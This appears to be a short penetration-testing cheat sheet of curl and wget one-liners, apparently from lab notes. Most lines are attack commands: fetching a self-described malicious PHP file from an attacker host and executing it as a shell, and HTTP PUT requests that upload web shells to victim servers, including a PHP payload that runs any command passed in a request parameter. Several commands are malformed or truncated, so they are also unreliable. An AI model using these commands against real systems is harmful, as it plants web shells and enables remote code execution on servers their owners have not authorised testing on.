# Handy HTTP commands

### curl

`curl -o http://192.168.x.x/malicious-shit.php`

you can also pipe in commands too such as

`curl -o http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php`

User agent change

`curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"`

#### HTTP PUT

`curl http://victim-site.com --upload-file file.txt`

`curl -X PUT -d '' http://192.168.0.105/test/shell.php`

`curl -X PUT -d '' http://10.11.1.14/shell.asp`

`curl -X PUT -d 'http://10.11.0.220/shell-p-444.asp' http://10.11.1.14/shell.asp`

`curl -X PUT -d '&%d 2>&%d",f,f,f)' ?>' http://10.11.1.14/shell.txt`

`curl -X PUT -d '"; $cmd = ($_REQUEST['cmd']); system($cmd); echo ""; die; }?>' http://10.11.1.229/poopypants.txt`

### wget

`wget -O - https://raw.githubusercontent.com/laurent22/joplin/master/Joplin_install_and_update.sh | bash`

`wget -O http://192.168.x.x/malicious-shit.php`

you can also pipe in commands too such as

`wget -O http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php`
